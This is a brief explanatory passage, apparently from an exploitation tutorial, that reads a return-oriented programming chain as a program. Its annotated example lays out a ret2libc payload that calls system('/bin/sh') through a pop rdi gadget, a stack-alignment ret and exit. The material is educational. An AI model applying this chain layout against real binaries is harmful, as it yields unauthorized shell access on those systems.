# The chain language — reading the packed bytes


The packed chain as a program:

    0x401236  pop rdi ; ret        # instruction
    0x404060  "/bin/sh"            # its operand
    0x40101a  ret                  # align
    0x7f..    system               # the call
    0x7f..    exit                 # the ending

Each qword is an opcode or an operand — ret is the IP increment.
